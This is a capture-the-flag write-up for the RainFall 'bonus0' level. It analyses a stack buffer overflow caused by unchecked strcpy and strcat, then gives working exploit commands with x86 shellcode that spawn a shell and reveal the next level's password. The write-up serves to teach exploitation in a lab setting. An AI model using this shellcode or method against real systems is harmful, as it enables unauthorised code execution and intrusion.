# Bonus0

## Analysis

```bash
bonus0@RainFall:~$ ./bonus0 
 - 
hi 
 - 
there
hi there
bonus0@RainFall:~$ ./bonus0 
 - 

 - 
```

Executing the program prompts us with inputs fields, it then prints what we wrote as an input. The program seems to read stdin 2 times.

### Code

We have 3 interesting functions:

### 1. `main()`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[42]; // [esp+16h] [ebp-2Ah] BYREF

  pp(s);
  puts(s);
  return 0;
}
```

- We have a 42bytes buffer `s` on the stack
- `s` is passed to `pp()`
- `s` is then printed by `puts()`

### 2. `pp()`

```c
char *__cdecl pp(char *dest)
{
  char src[20]; // [esp+28h] [ebp-30h] BYREF
  char v3[28]; // [esp+3Ch] [ebp-1Ch] BYREF

  p(src, " - ");
  p(v3, " - ");
  strcpy(dest, src);
  *(_WORD *)&dest[strlen(dest)] = unk_80486A4;
  return strcat(dest, v3);
}
```

- 2 buffers: `src` of 20bytes and `v3` of 28bytes
- `src` is passed to `p()` first.
- `v3` is also passed to `p()`.
- Both `p()` calls don't specify any length for the passed buffers.
- notes:
    - `strcpy()` doesn't check for length -> buffer overflow
    - `strcat()` doens't check for available length and modified `s` passed from `main()`

### 3. `p()`

```c
char *__cdecl p(char *dest, char *s)
{
  char buf[4104]; // [esp+10h] [ebp-1008h] BYREF

  puts(s);
  read(0, buf, 0x1000u);
  *strchr(buf, 10) = 0;
  return strncpy(dest, buf, 0x14u);
}
```

- a 4104bytes buffer `buf`.
- prints `s`.
- reads 4096bytes from `stdin` into `buf`.
- replaces `10` or newline, in `buf` by 0.
- copies 20 bytes of `buf` into `dest` (`dest` won't contain any null terminating byte if its size > 20)

## Exploit explained

Since we don't have access to anything through this code, we will have to spawn a shell using a buffer oferflow with a shellcode.

The said shellcode will be stored in the `char buf[4104]` inside of `p(char *dest, char *s)`. Since `p()` is executed twice, the content of its local buffer will be overwritten if we pass a bigger input during the second exec, so we need to make sure to pass enough garbage characters into the buffer during the first one.

```
arg 1: [100 padding] + [shellcode]

arg 2: [9 padding] + [shellcode addr] + [8 padding]
```

```bash
bonus0@RainFall:~$ python -c 'print"aaaabbbbccccddddeeee"' > /var/crash/1.txt 
bonus0@RainFall:~$ python -c 'print"ffffgggghhhhiiiijjjj"' > /var/crash/2.txt

(gdb) r < <(cat /var/crash/1.txt; sleep .50; cat /var/crash/2.txt)        
Starting program: /home/user/bonus0/bonus0 < <(cat /var/crash/1.txt; sleep .50; cat /var/crash/2.txt)
 - 
 - 
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjj��� ffffgggghhhhiiiijjjj���

Program received signal SIGSEGV, Segmentation fault.
0x69686868 in ?? ()
```

Segfaults happens while trying to access `0x69686868`, it corresponds to the part of our second argument:

```
            [eip]
ffffggggh | hhhi | iiijjjj���
```

This is where we should put the address of the shellcode contained in our buffer in `p()`, the offset being 9.

## pp() behavior

We have two buffers: `char src[20]` and `char v3[28]`, its 8 bytes difference doesn't matter since `strncpy(dest, src, 0x14)` inside of `p()` only copies 20 characters inside the dest, so `v3` will never be full.

`strcpy(dest, src)` can behave unintentionally if the size of src > 20, in this case, it will copy src and whatever is after it in memory until it finds a `\0`. In our case, `v3` is next.

So at this point `dest` is made of: `[src] + [v3]`.

`*(_WORD *)&dest[strlen(dest)] = unk_80486A4;` this line can be resumed to `dest[strlen(dest)] = 0;` which just null terminates the string.

Lastly, `strcat(dest, v3)` will transform our `dest` into the following: `[src] + [v3] + [v3]`.

# Solution

<details>
  <summary>Spoiler</summary>


We will use the following command to form, pass our payload and spawn a shell to cat the password:

```bash
bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 8'; cat) | ./bonus0
 - 
 - 
��������������������AAAAAAAAA����BBBBBBB��� AAAAAAAAA����BBBBBBB���
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

There is also this solution, which works inside of a shell but not while using gdb:

```bash
(python -c 'print "a" * 46 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; python -c 'print "ggggghhhh" + "\xbe\xe6\xff\xbf" +"jjjjkkkk"'; cat) | ./bonus0
```
</details>
